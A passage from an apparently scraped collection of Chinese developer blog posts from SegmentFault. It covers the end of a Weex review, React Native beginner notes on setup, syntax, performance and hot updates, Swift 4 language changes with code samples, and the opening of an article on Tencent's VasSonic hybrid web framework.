<p>意思就是，三端统一的不够彻底，但就目前的环境下，这一句是最优方案了，却是提高了开发效率。大前端将来将如何一统三国我们且行且观望吧。</p>
<h4>做游戏</h4>
<p>对于一些交互视觉统一且没有很大的性能需求的游戏，Weex 还是可以胜任的。</p>
<p>近期笔者将尝试发布一款纯Weex构建的益智小游戏，敬请期待。</p>
<p>朋友们可以用这个demo体验下 <a href=""https://yq.aliyun.com/articles/42627?spm=5176.100239.blogcont57995.19.OsYCTt"" rel=""nofollow noreferrer"">Weex 版扫雷游戏开发</a></p>
<h3>Weex “暂时”放弃的</h3>
<p>虽然说大一统事件百利的事，但并非无一害。</p>
<h4>差异化</h4>
<p>对于一些有差异化完美体验追求的项目就只能收敛或者放弃了。</p>
<h4>独立的 bug 修复</h4>
<p>对于三端同时上线，一端存在 bug 的情况，Weex 并不能保证做到牵一发而不动全身。</p>
<h4>个性化功能</h4>
<p>比如安卓的波纹按钮、3DTouch、 Widget、iWatch版本等，目前这些功能还是没有的，不知道以后 Weex<br> 是否将其加入到官方文档中。</p>
<h1>声明</h1>
<p>以上均为个人见解，不代表官方。如有不当之处还望指正。</p>
<h1>参考</h1>
<p>[ 1 ] <a>Weex官方文档</a> - <a href=""http://weex.apache.org/cn/references/"" rel=""nofollow noreferrer"">http://weex.apache.org/cn/references/</a><br>[ 2 ] <a href=""https://yq.aliyun.com/users/1429056118386139"" rel=""nofollow noreferrer"">场景研读</a> - <a href=""https://yq.aliyun.com/articles/69005"" rel=""nofollow noreferrer"">Native 性能稳定性极致优化 - https://yq.aliyun.com/articles/69005</a><br>[ 3 ] <a href=""https://yq.aliyun.com/users/1860372613355779"" rel=""nofollow noreferrer"">门柳</a> - <a href=""https://yq.aliyun.com/articles/59935?spm=5176.8067842.tagmain.66.1QA1fL"" rel=""nofollow noreferrer"">详解 Weex JS Framework 的编译过程 - https://yq.aliyun.com/articles/59935?spm=5176.8067842.tagmain.66.1QA1fL</a><br>[ 4 ] <a href=""https://segmentfault.com/u/alibaichuan"" rel=""nofollow noreferrer"">阿里百川</a> - <a href=""https://segmentfault.com/a/1190000005031818"" rel=""nofollow noreferrer"">深度揭秘阿里移动端高性能动态化方案Weex - https://segmentfault.com/a/1190000005031818</a><br>[ 5 ] <a href=""http://www.jianshu.com/u/12201cdd5d7a"" rel=""nofollow noreferrer"">一缕殇流化隐半边冰霜</a> - <a href=""http://www.jianshu.com/p/41cde2c62b81"" rel=""nofollow noreferrer"">Weex 是如何在 iOS 客户端上跑起来的 - http://www.jianshu.com/p/41cde2c62b81</a></p>
<blockquote>转载请标明出处<br>作者：<a href=""https://github.com/zwwill"" rel=""nofollow noreferrer"">木羽 zwwill</a><br>首发地址：<a href=""https://github.com/zwwill/blog/issues/11"" rel=""nofollow noreferrer"">https://github.com/zwwill/blo...</a>
</blockquote>

                ", 网易严选App感受Weex开发（已完结）,1531971930,300,1,823,1,1,https://segmentfault.com/a/1190000011027225
45,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010989350"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<blockquote><p>ReactNative的文档地址有多个，如果你英文够好，就去研读<a href=""http://facebook.github.io/react-native/docs/getting-started.html"" rel=""nofollow noreferrer"">官方的文档</a>吧，<br>如果读原文比较吃力，<a href=""http://reactnative.cn/docs/0.45/getting-started.html"" rel=""nofollow noreferrer"">中文官网</a>也是不错的选择。</p></blockquote>
<p><em>下面是我个人记录的一些笔记，仅供初学者入门参考</em></p>
<h1>预科</h1>
<p>入门React Native前需要了解一下知识，这样能帮助你更快的掌握RN<br>Node：<a href=""http://www.runoob.com/nodejs/nodejs-tutorial.html"" rel=""nofollow noreferrer"">Node.js 教程</a><br>ReactJS：<a href=""http://www.ruanyifeng.com/blog/2015/03/react.html"" rel=""nofollow noreferrer"">《React 入门实例教程》</a><br>ES6：<a href=""http://es6.ruanyifeng.com/"" rel=""nofollow noreferrer"">《ECMAScript 6 入门》</a></p>
<h1>环境</h1>
<h2>系统环境要求</h2>
<p>IOS : <code>MacOS</code>, <code>黑苹果</code><br>Android :<code>MacOS</code>,  <code>Linux</code>, <code>Windows</code></p>
<h2>配置</h2>
<p>所有的技术学习都应该从环境搭建开始，这里也没什么好总结的，最好的方法就是跟着<a href=""http://reactnative.cn/docs/0.45/getting-started.html#content"" rel=""nofollow noreferrer"">官网指导配置环境</a><br>如果你是node的老手，那就直接动手安装以下环境吧：</p>
<ul>
<li>node</li>
<li>npm</li>
<li>react-native-cli</li>
<li>Xcode<br>安装Xcode IDE和Xcode的命令行工具（IOS开发依赖）</li>
<li>Android Studio<br><strong>下载必须的插件：</strong>
</li>
</ul>
<p>a) JDK1.8+<br>b) Show Package Details<br>c) Android SDK Build Tools <strong>（指定23.0.1版本）</strong><br>d) Android Support Repository<br><strong>配置基础环境：</strong><br>a) ANDROID_HOME （如运行是遇到问题可参考此文<a href=""http://www.jianshu.com/p/a77396301b22"" rel=""nofollow noreferrer"">http://www.jianshu.com/p/a77396301b22</a>）<br>b) JAVA_HOME</p>
<h2>测试</h2>
<pre><code>react-native init RNDemo
cd RNDemo
react-native run-ios</code></pre>
<p>如果你的虚拟机启动了，那么恭喜你，你的环境已经配置成功！<br>如果运行报错，可以文章最后找寻解决方案。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010989351"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""虚拟机启动界面"" title=""虚拟机启动界面""></span></p>
<h1>语法</h1>
<p>首先需要了解一些基本的React的概念，比如JSX语法、组件、state状态以及props属性。<br>还需要掌握一些React Native特有的知识，比如原生组件的使用。</p>
<blockquote><p>教程上的东西我就不多说了，<a href=""http://reactnative.cn/docs/0.45/getting-started.html"" rel=""nofollow noreferrer"">官方文档</a>上有详细的讲解</p></blockquote>
<p>直接从代码上讲解新手注意点吧</p>
<h2>Hello World</h2>
<p>传统惯例，入门先行，Hello World</p>
<p><em>你可以新建一个项目，然后用上面的代码覆盖你的index.ios.js或是index.android.js 文件，然后运行看看。</em></p>
<pre><code class=""jsx"">import React, { Component } from 'react';
import { AppRegistry, StyleSheet, Text } from 'react-native';
class HelloWorldApp extends Component {
  render() {
    return (
      &lt;Text style={styles.red}&gt;Hello world!&lt;/Text&gt;
    );
  }
}
const styles = StyleSheet.create({
  red: {
    color: 'red',
    fontWeight: 'bold',
  }
});
// 注意，这里用引号括起来的'HelloWorldApp'必须和你init创建的项目名一致
AppRegistry.registerComponent('HelloWorldApp', () =&gt; HelloWorldApp);</code></pre>
<p>从语法上看，RN和ReactJS语法区别不大，都是采用JSX和ES6的形式，如果你对ReactJS和ES6不熟悉，建议你先拜读下阮一峰的博文教程：<a href=""http://www.ruanyifeng.com/blog/2015/03/react.html"" rel=""nofollow noreferrer"">《React 入门实例教程》</a>，<a href=""http://es6.ruanyifeng.com/"" rel=""nofollow noreferrer"">《ECMAScript 6 入门》</a></p>
<p>相较写Web App，区别在于RN的语法引入了原生的组件</p>
<pre><code class=""jsx"">import { AppRegistry, StyleSheet, Text } from 'react-native';</code></pre>
<p>RN中虽然使用JS写原生UI，但不再使用常规HTML标签 <code>&lt;div&gt;</code> 或是 <code>&lt;span&gt;</code> ，而是使用RN的组件 <code>&lt;Text&gt;</code><br><code>AppRegistry</code> 模块写在index.ios.js或是index.android.js文件里，用来告知React Native哪一个组件被注册为整个应用的根容器，一般一个应用只运行一次。</p>
<p>仅仅使用props和基础的View、Text、Image以及TextInput组件，就足以编写各式各样的UI组件了</p>
<h2>样式</h2>
<p>按照JSX的语法要求使用了驼峰命名法：</p>
<ul>
<li>font-weight -&gt; fontWeight</li>
<li>background-color -&gt; backgroundColor</li>
</ul>
<p>React Native中的尺寸都是无单位的，表示的是与设备像素密度无关的逻辑像素点：</p>
<pre><code class=""html"">&lt;View style={{width: 50, height: 50, backgroundColor: 'powderblue'}} /&gt;</code></pre>
<h2>事件</h2>
<p>事件的注册跟ReactJS没什么区别</p>
<pre><code class=""jsx"">class MyButton extends Component {
  _onPressButton() {
    console.log(""You tapped the button!"");
  }

  render() {
    return (
      &lt;TouchableHighlight onPress={this._onPressButton}&gt;
        &lt;Text&gt;Button&lt;/Text&gt;
      &lt;/TouchableHighlight&gt;
    );
  }
}</code></pre>
<p>此处注册的组件为<code>TouchableHighlight</code>，具体使用哪种组件，取决于你希望给用户什么样的视觉反馈</p>
<ul>
<li>一般来说，你可以使用<a href=""http://reactnative.cn/docs/0.45/touchablehighlight.html"" rel=""nofollow noreferrer""><strong>TouchableHighlight</strong></a>来制作按钮或者链接。注意此组件的背景会在用户手指按下时变暗。</li>
<li>在Android上还可以使用<a href=""http://reactnative.cn/docs/0.45/touchablenativefeedback.html"" rel=""nofollow noreferrer""><strong>TouchableNativeFeedback</strong></a>，它会在用户手指按下时形成类似墨水涟漪的视觉效果。</li>
<li>
<a href=""http://reactnative.cn/docs/0.45/touchableopacity.html"" rel=""nofollow noreferrer""><strong>TouchableOpacity</strong></a>会在用户手指按下时降低按钮的透明度，而不会改变背景的颜色。</li>
<li>如果你想在处理点击事件的同时不显示任何视觉反馈，则需要使用<a href=""http://reactnative.cn/docs/0.45/touchablewithoutfeedback.html"" rel=""nofollow noreferrer""><strong>TouchableWithoutFeedback</strong></a>。</li>
</ul>
<p>常用的事件有：<br>点击：onPress<br>长按：onLongPress<br>缩放：maximumZoomScale，minimumZoomScale</p>
<blockquote><p>另外关于Props、State、样式、布局、事件等知识点的详解，<a href=""http://reactnative.cn/docs/0.45/getting-started.html"" rel=""nofollow noreferrer"">官方文档</a>上都有详细的讲解，比较基础，这里就不做介绍了</p></blockquote>
<h1>跨平台</h1>
<blockquote><p>'Learn Once,Write Anywhere' and not 'Write Once,Running Anywhere'.</p></blockquote>
<p>RN并不能算上是真正的跨平台的语言，虽然可以通过打包实现不同平台打包不同组件，但是有些组件需要我们针对不同平台编写不同代码。这就要求我们不用储备一些原生开发的知识。</p>
<h1>工作原理</h1>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010989352"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""通信示意图"" title=""通信示意图""></span><br>RN的本质是在两个模块之间搭建双向桥梁，让他们可以相互调用和响应，简单的示意图为<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010989353"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>Native模块</h2>
<p>运行在主线程上(可能会有些独立的后台线程处理运算，当前讨论中可忽略) <br>iOS平台上运行Object-C/Swift代码，Android平台上运行Java/Kotlin代码 <br>负责处理UI的渲染，事件响应。</p>
<h2>JS模块</h2>
<p>运行在JS引擎的JS线程上 <br>运行JS代码 <br>负责处理业务逻辑，还包括了应该显示哪个界面，以及如何给页面加样式。</p>
<h2>Bridge模块</h2>
<p>Native和JS模块之间不能直接通信，只能通过Bridge做序列化和反序列化，查找模块，调用模块等各种逻辑，最终反应到应用上</p>
<h1>性能</h1>
<p>使用React Native替代基于WebView的框架，使App刷新可以达到每秒60帧（足够流畅），并且能有类似原生App的外观和手感，虽然RN框架已经提供了这个平衡的能力，但平衡点的选择却掌握在开发者手中，即便是Native也无法避免开发方式带来的性能消耗</p>
<h2>性能影响原因</h2>
<p>业务逻辑运行在JS线程上，负责API的调用，事件的处理，状态的更新，而事件的响应UI的变化发生在主线程上，60帧/s的频率要求每一帧的响应处理只有16.67(1000/60)ms，如果超过了16.67ms就会发生丢帧，如果丢帧超过100ms就会产生明显的卡顿现象。所有降低每一帧运算的消耗才能提升性能。</p>
<h2>性能影响切面</h2>
<p><strong>UI事件响应：</strong> 性能影响小<br><strong>UI更新：</strong> JS侧会向Native侧同步大量的UI结构和数据，界面复杂、变动数据大，或者做动画、变动频繁，容易出现性能问题。<br><strong>UI事件响应和UI更新同时出现：</strong> 两种事件如果占用了过多的线程，就会导致另一种事件不能及时响应，表现在应用上就是卡顿</p>
<h2>常见影响性能的点</h2>
<p>console，ListView，动画Animated</p>
<h1>性能优化</h1>
<p>经过多年的发展和优化，JS和Native可以在各自的模块线程高效迅速的运行，性能的瓶颈主要在Bridge模块上，尤其是在JS和Native模块间频繁的调用会导致Bridge压力过大，产生卡顿</p>
<ol>
<li>利用React自带的Virtual Dom的Diff算法尽量减少需要同步的数据，<strong>合理利用setState方法</strong>
</li>
<li>在遇到动画性能问题时，可以<strong>使用Annimated类的库</strong>，一次性把如何变化的声明发送到Native侧，Native侧根据接收到的声明自己负责接下来的UI更新。不需要每帧的UI变化都同步一次数据。</li>
<li>Native和JS混编，把会大量变化的组件做成<strong>Native组件</strong>
</li>
<li>遇到UI事件响应和UI更新同时，可以使用<strong>Interaction Manager</strong>把那些耗时较长的<strong>工作安排到所有互动或动画完成之后再进行</strong>
</li>
</ol>
<h1>App高性能开发引导</h1>
<p>RN的开发并没有一种高质量产出的方法，因为各个项目间有着不同的组件组合，因此只能通过高效的开发方式来尽可能的优化应用。<br>一般来说，通过几版优化都能达到“极致体验”的要求。<br>下面列一下高效开发方式的流水：</p>
<ol>
<li>
<strong>全JS实现</strong>，保证开发的高效率，高产出</li>
<li>发现问题<strong>先在JS测做优化</strong>，如上面提到的Annimated类库，Interaction Manager。</li>
<li>真机测试，找全问题再做处理，<strong>避免出现连锁bug</strong>
</li>
<li>JS测解决不了的问题再有<strong>Native组件</strong>完成。</li>
</ol>
<h1>关于热更新</h1>
<h2>原理</h2>
<p>1、RN是使用脚本语言来编写的，是的代码可以不用事先编译便可即读即运行<br>2、RN在发布时将代码资源打包成一个文件 bundle js文件<br>3、其他的基础插件不变，仅仅替换一个bundle文件就实现了热更新</p>
<h2>流程</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010989354"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""热更新的流程图"" title=""热更新的流程图""></span></p>
<h2>Rushy</h2>
<p>Rushy是国内RN团队自主研发的一套热更新包管理平台</p>
<h3>Pushy的特点：</h3>
<ol>
<li>命令行工具&amp;网页双端管理，版本发布过程简单便捷，完全可以集成CI。</li>
<li>基于bsdiff算法创建的超小更新包，通常版本迭代后在1-10KB之间，避免数百KB的流量消耗。</li>
<li>支持崩溃回滚，安全可靠。</li>
<li>meta信息及开放API，提供更高扩展性。</li>
<li>跨越多个版本进行更新时，只需要下载一个更新包，不需要逐版本依次更新。</li>
</ol>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010989355"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h1>社区</h1>
<p>RN同ReactJS一样，有着强大的社区，从RN版本更新的速度上就可以看出来<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010989356"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""发布序列表"" title=""发布序列表""></span><br>平均2个月一个版本</p>
<p>google的搜索结果也能说明RN的影响力</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010989357"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""google搜索结果"" title=""google搜索结果""></span></p>
<p>开发者需要用到的组件在JS.Coach基本都可以找到。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010989358"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image.png"" title=""image.png""></span></p>
<h1>参考&amp;分享</h1>
<ul>
<li><a href=""http://reactnative.com"" rel=""nofollow noreferrer"">ReactNative 官方网站：http://reactnative.com</a></li>
<li><a href=""http://reactnative.cn"" rel=""nofollow noreferrer"">ReactNative 中文官方网站：http://reactnative.cn</a></li>
<li><a href=""http://zhuanlan.51cto.com/art/201704/537115.htm"" rel=""nofollow noreferrer"">React Native性能和效率平衡之谜：http://zhuanlan.51cto.com/art/201704/537115.htm</a></li>
<li><a href=""http://blog.cnbang.net/tech/2698/"" rel=""nofollow noreferrer"">React Native通信机制详解：http://blog.cnbang.net/tech/2698/</a></li>
<li><a href=""http://www.jianshu.com/p/978c4bd3a759"" rel=""nofollow noreferrer"">React Native 从入门到原理：http://www.jianshu.com/p/978c4bd3a759</a></li>
<li><a href=""http://www.jianshu.com/p/fd4591a978ba"" rel=""nofollow noreferrer"">React-Native学习指南：http://www.jianshu.com/p/fd4591a978ba</a></li>
<li><a href=""http://www.jianshu.com/c/45054b9e38c7"" rel=""nofollow noreferrer"">【简书专题】React Native开发经验集：http://www.jianshu.com/c/45054b9e38c7</a></li>
</ul>

                ", 【笔记】ReactNative快速入门笔记,1531971932,493,1,834,1,1,https://segmentfault.com/a/1190000010989345
46,1,0,6,"
                    
<p><code>iOS 11</code>九月份就要正式发布了。拖延症表示陆陆续续还没看完<code>WWDC</code>~?。除了重磅的<code>ARKit</code>和<code>Core ML</code>，其他更像是小修小补。连<code>Swift 4</code>都不是一门新语言，算什么<code>WWDC</code>~~~</p>
<p>陆陆续续写一些<code>iOS 11</code>的玩意儿吧～</p>
<p>这是关于<code>Swift 4</code>的～～～～</p>
<h3>Access Control</h3>
<p>想给<code>Swift</code>跪了～～～</p>
<p><code>Swift</code>么有<code>Objective-C</code>的<code>.h</code>和<code>.m</code>这样泾渭分明，哪些该露点的，哪些不该露点的，都很清晰。于是在<code>Swift</code>中有了<code>access control</code>，就是<code>public</code>啊，<code>private</code>啊，<code>fileprivate</code>啊等。</p>
<p><code>Swift 4</code>中，主要是对<code>private</code>进行重新定义。在<code>Swift 3</code>中，<code>private</code>表明的属性和方法，是无法在<code>extension</code>中使用的，只有<code>fileprivate</code>才可以。但是～～～，<code>Swift 4</code>觉得不太合理，所以，<code>private</code>可以在<code>extension</code>中使用了～～～还是上个?吧。。</p>
<pre><code class=""swift"">struct Foo {
    private let a : Int
    fileprivate let b : Int
    private func testA() {}
    fileprivate func testB() {}
}

extension Foo {
    func testAB() {
        print(a)        // private 标注的 a 属性，在 Swift 3 中是无法使用的
        print(b)
        testA()         // private 标注的 testA 方法，在 Swift 3 中是无法使用的
        testB()
    }
}</code></pre>
<h3>dynamic</h3>
<p><code>Swift 3</code>中<code>dynamic</code>是自带<code>@objc</code>，但是<code>Swift 4</code>中，<code>dynamic</code>不在包含<code>@objc</code>了。所以有些需要使用到<code>@objc</code>标明的方法，在<code>Swift 4</code>得补回去。之前为了让<code>Swift</code>可以使用<code>JSPatch</code>，于是乎，给一些方法都加了<code>dynamic</code>～～～～累cry～～</p>
<h3>Swift &amp; Objective-C</h3>
<p>直接上个?。</p>
<pre><code class=""swift"">class Foo {
    let a : Int
    func testA() {}
}</code></pre>
<p><code>Swift 3</code>中，如果是在<code>Objective-C</code>中使用上述的代码，那么是可以成功调用到<code>foo.a</code>和<code>[foo testA]</code>的。在对应的<code>xxx-Swift.h</code>文件中，也可以看到相关的转换成<code>Objective-C</code>的代码。但是！！！在<code>Swift 4</code>，这些都不成立了。如果要使用，那么需要标上<code>@objcMembers</code>或者<code>@objc</code>。也就是——</p>
<pre><code class=""swift"">class Foo {
    @objcMembers let a : Int
       @objcMembers func testA() {}
   // 又或者
   @objc let b : Int
       @objc func testB() {}
}
</code></pre>
<p>不过，文档更推荐使用<code>@objcMembers</code>。据悉，<code>@objc</code>相对于<code>@objcMembers</code>而来，可能会增大包的编译大小。而且，最好是在需要使用到的地方才用上<code>@objcMembers</code>，而不是所有都标明～～</p>
<h3>NSAttributedString</h3>
<p>先前，诸如类似<code>NSFontAttributeName</code>,<code>NSForegroundColorAttributeName</code>等这些，在<code>Swift 4</code>中，统统变成<code>NSAttributedStringKey.font</code>,<code>NSAttributedStringKey.foregroundColor</code>等这些更佳<code>Swift</code>化的形式了。</p>
<h3>String</h3>
<h4>字符串长度</h4>
<table>
<thead><tr>
<th>Swift 3</th>
<th>Swift 4</th>
</tr></thead>
<tbody><tr>
<td>""xxx"".characters.count</td>
<td>""xxx"".count</td>
</tr></tbody>
</table>
<h4>换行</h4>
<pre><code class=""swift"">// Swift 3 换行需要用到换行符 \n
let str = ""xxx\nxxx""

// Swift 4 有了更方便的表示。使用 """""" 。不过得保持一致的缩进
let str = """"""
            xxx
            xxx
            """"""</code></pre>
<h4>split</h4>
<p>这方法是进行切割字符串的。看?！</p>
<pre><code class=""swift"">var str = ""Hello, playground""
let strArr = str.split(separator: "","") // [""Hello"",""playground""]</code></pre>
<p>但是切割得到的数组是<code>[SubString]</code>。因此，在赋值的时候，需要对其进行强转，即<code>String(SubString)</code>这样。</p>
<h3>Codable</h3>
<p><code>Swift 4</code>中，加入了<code>Codable</code>协议，可以将<code>JSON</code>给转换成对应的<code>Struct</code>或者<code>Class</code>，也可以将其他的格式转成对应的。</p>
<p><code>Codabel</code>是由<code>Decodable</code>和<code>Encodable</code>两个协议组成的。</p>
<blockquote><p>public typealias Codable = Decodable &amp; Encodable</p></blockquote>
<p>直接上?。</p>
<pre><code class=""swift"">let jsonStr = """"""
       {
            ""id"": 123455,
            ""nickname"": ""Ben"",
            ""isMale"": true,
            ""birthday"": ""2000年3月24日"",
            ""personalURL"": ""https://addicechan.github.io""
        }
        """"""</code></pre>
<pre><code>let jsonData = jsonStr.data(using: .utf8)!
let decoder = JSONDecoder()
let dateFormatter = DateFormatter()
dateFormatter.dateFormat = ""YYYY年MM月dd日""
decoder.dateDecodingStrategy = .formatted(dateFormatter)
do {
    let user = try decoder.decode(User.self, from: jsonData)
    print(user)
    print(user.personalURL.scheme ?? ""http?https?"")
} catch let error {
    print(error.localizedDescription)
}
</code></pre>
<p>使用上，并不困难。使用<code>JSONDecoder</code>可以对一些时间格式进行处理，比如上述?就是自定义时间格式。当然还可以用时间戳显示等。<code>dateDecodingStrategy</code>属性是一个<code>DateDecodingStrategy</code>枚举值来着。具体瞅文档吧。</p>
<p>可以解码，当然也可以进行编码。</p>
<pre><code class=""swift"">// 接着???的?
let user1 = User(id: 1000,
                 nickname: ""ADDICE"",
                 isMale: true,
                 birthday: Date(),
                 personalURL: URL(string: ""https://addicechan.github.io"")!)
                 
let encoder = JSONEncoder()
encoder.dateEncodingStrategy = .formatted(dateFormatter)
do {
    let data = try encoder.encode(user1)
    let str = String.init(data: data, encoding: .utf8)!
    print(str)
} catch let encodeError {
    print(encodeError.localizedDescription)
}
</code></pre>
<p>有了<code>Codable</code>，对<code>JSON</code>格式的转换也是方便很多。不过实际在项目中使用还是有待验证吧。不过这倒是解决了之前<code>Swift</code>原生代码对<code>JSON</code>数据的解析，不用各种嵌套。反正，使用这个协议还可以支持其他数据格式，并不是单单<code>JSON</code>一种。</p>
<h3>KVC</h3>
<pre><code class=""swift"">class Foo: NSObject {
    @objc var age : Int
    var name : String
    init(age: Int, name: String) {
        self.age = age
        self.name = name
    }
}
let foo = Foo(age: 10, name: ""foo"")
#if swift(&gt;=4.0)
    let key = \Foo.age
    foo[keyPath: key] = 50
    print(foo[keyPath: \ Foo.name])
#else
    let key = #keyPath(Foo.age)
    foo.setValue(20, forKey: key)
#endif
print(foo.age)</code></pre>
<p>较之<code>Swift 3</code>的<code>#keyPath(T.property)</code>这种方式，<code>Swift 4</code>用一个<code>\</code>去表示一个<code>keyPath</code>，而且具备各种推断，并且还可以用于<code>struct</code>。<code>Swift</code>是一门强类型的安全语言，所以使用改版后的<code>KeyPath</code>可以推断到原来的类型，而不是再是<code>Any</code>。不过，先前用<code>#keyPath</code>这种生成字符串的方式，居然没有被废除～?</p>
<p><code>KeyPath</code>的基类是<code>AnyPath</code>。<code>AnyPath</code>拥有<code>rootType</code>和<code>valueType</code>。根据上述的?，那么<code>key</code>的类型其实应该是<code>KeyPath&lt;Foo, Int&gt;</code>。也就是，如果你要取到<code>Foo.age</code>，其实也可以这样去写——</p>
<pre><code class=""swift"">let key : KeyPath&lt;Foo, Int&gt; = \Foo.age</code></pre>
<p>但是很多时候，我们会选择使用推导类型，所以还是懒一些吧。</p>
<p>其实按照文档来说，<code>KeyPath</code>的层级式这样的。</p>
<table>
<thead><tr>
<th>类</th>
<th>说明</th>
</tr></thead>
<tbody>
<tr>
<td>AnyPath</td>
<td>基类，用<code>Root</code>和<code>Value</code>属性，以及<code>appending(path: AnyKeyPath)</code>可以进行拼接<code>keyPath</code>
</td>
</tr>
<tr>
<td>PartialKeyPath&lt;Root&gt;</td>
<td>继承自<code>AnyPath</code>，只声明了<code>Root</code>类型，<code>Value</code> 均为<code>Any</code>
</td>
</tr>
<tr>
<td>KeyPath&lt;Root,Value&gt;</td>
<td>继承自<code>PartialKeyPath</code>，携带了<code>Root</code>和<code>Value</code>，都有明确的类型</td>
</tr>
<tr>
<td>WritableKeyPath&lt;Root,Value&gt;</td>
<td>继承自<code>KeyPath</code>，可读可写，用于<code>struct</code>这种值类型。</td>
</tr>
<tr>
<td>ReferenceWritableKeyPath&lt;Root,Value&gt;</td>
<td>继承自<code>WritableKeyPath</code>，可读可写，用于<code>class</code>这种引用类型。</td>
</tr>
</tbody>
</table>
<p>另外，发现一个<code>bug</code>。当用<code>KeyPath</code>去更改<code>struct</code>里面的值时，只能读，不能写。但是<code>WWDC</code>的<code>keynote</code>显示又是可读可写。。寂寞。不知道是不是<code>Debug</code>版本的锅。反正我用的是<code>Xcode 9 beta 6</code>。</p>
<p>上个<code>WWDC</code>上面的那个?。</p>
<pre><code class=""swift"">@objcMembers
class Kid : NSObject {
    dynamic var nickname: String = """"
    dynamic var age: Double = 0.0
    dynamic var bestFriend: Kid? = nil
    dynamic var friends: [Kid] = []
    init(nickname: String, age: Double) {
        super.init()
        self.nickname = nickname
        self.age = age
    }
}

struct BirthdayParty {
    let celebrant: Kid
    var theme: String
    var attending: [Kid]
}</code></pre>
<pre><code class=""swift"">let ben = Kid(nickname: ""Benji"", age: 5.5)

var bensParty = BirthdayParty(celebrant: ben, theme: ""Construction"", attending: [])

let birthdayKid = bensParty[keyPath: \BirthdayParty.celebrant]

bensParty[keyPath: \BirthdayParty.theme] = ""Pirate""</code></pre>
<h3>KVO</h3>
<p>当需要监听对象某个属性的时候，通常我们会使用<code>KVO</code>的方式，利用<code>addObserver</code>来添加观察者，之后在</p>
<blockquote><p>func observeValue(forKeyPath keyPath: String?, of object: Any?, change: [NSKeyValueChangeKey : Any]?, context: UnsafeMutableRawPointer?)</p></blockquote>
<p>进行处理。但是，<code>Swift 4</code>有了更加简单的观察形式。</p>
<pre><code class=""swift"">// 方式一
// observer 为 被观察的对象，keyValueChange 为被观察的属性的变化
foo.observe(\FooClass.age, options: .new, changeHandler: { (observer, keyValueChange) in 
})

// 方式二
foo.observe(\FooClass.age, changeHandler: { (observer, keyValueChange) in
    
})</code></pre>
<p><code>Swift 4</code>大致上整理到这些。还有其他的一些更新。推荐还是看官方文档。上述的内容，估计也会有遗漏，或者错误。请多包涵～?</p>
<p><a href=""https://github.com/AddIcechan/ios11"" rel=""nofollow noreferrer"">Demo</a>在此～～～</p>

                ", iOS 11 的一些玩意儿: Swift 4,1531971933,376,1,547,1,1,https://segmentfault.com/a/1190000010878701
47,1,0,6,"
                    
<h1>VasSonic成长历程</h1>
<hr>
<h2>前言</h2>
<p>2017.8.8 14时，SNG增值产品部Vas团队研发的轻量级高性能Hybrid框架VasSonic通过了公司最终审核，作为腾讯开源组件分享给大家。从当初立项优化页面加载速度，到不断摸索、优化，再到整理代码、文档，最终在Github上开源，并且在24小时内获取star数超过1600。我们非常高兴看到我们的成果收到这么多的关注，趁此机会，正好回顾一下VasSonic的成长历程，也希望能够让大家更了解VasSonic。</p>
<h2>项目背景</h2>
<p>Web相信大家再熟悉不过了，它具有快速迭代发布的天然优势，但也存在中一些让人诟病的问题，比如加载速度慢，体验差等。在此之前，手Q上很多页面首屏打开速度居高不下，甚至有些耗时达到3s以上，这意味着用户打开页面必须经过3秒之后才能进行交互操作，体验相当差，很多用户忍受不了这个漫长的时间直接流失掉了。</p>
<p>为了提升用户体验和业务用户留存率，我们很多业务一开始通过Web开发，等页面模型验证符合预期后，再将H5页面转化成原生界面。我们很快意识到这不是一种健康的可持续的开发模式，一方面存在重复人力浪费，另外一方面原生商城除了速度快一点，要运营活动改版都很难。</p>
<p>所以后来团队改了切入方向，安排人力专心研究如何加快页面打开速度，经过了一系列的摸爬滚打和优化探索，最终我们研发出了VasSonic框架，让H5页面首屏达到秒开，给用户一个更好的H5体验。下面就和大家分享VasSonic框架的发展历程。</p>
<h2>业务形态</h2>
<p>任何一个技术框架都是结合具体的业务形态来进行发展优化的，技术是为了更好地服务业务，业务也会驱动技术的发展。在此首先介绍一下业务形态，我们是来自手Q增值产品部门的VAS团队，负责手机QQ上很多深受年轻人喜欢的个性化增值服务，比如气泡、挂件、主题等等。手Q上大部分的业务还是基于H5开发的，大家对手Q的业务形态可能有简单的了解。比如下图的游戏分发中心、会员特权中心、个性化装扮商城等。这部分商城的特点比较明显，页面的很多数据都是动态的，是由我们的产品经理在后台配置的。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010711029"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""业务"" title=""业务""></span></p>
<p>这些都是很常见页面，我们通常将html/js/css等静态资源放到CDN上，然后页面加载后，再通过CGI去拉取最新的数据，进行拼接展示， 这样子可以利用到CDN的多地部署和就近接入等优势，同时提高了服务器的并发能力。这种传统模式的加载流程如下所示： <br><span class=""img-wrap""><img data-src=""/img/remote/1460000010711030"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""加载流程"" title=""加载流程""></span></p>
<ol>
<li>用户点击后，经过终端一系列初始化流程，比如进程启动、Runtime初始化、创建WebView等等。</li>
<li>完成初始化后，WebView开始去CDN上面请求Html加载页面。</li>
<li>页面发起CGI请求对应的数据或者通过localStorage获取数据，数据回来后再对DOM进行操作更新</li>
</ol>
<p>可以看出上述流程存在着几个问题：</p>
<ol>
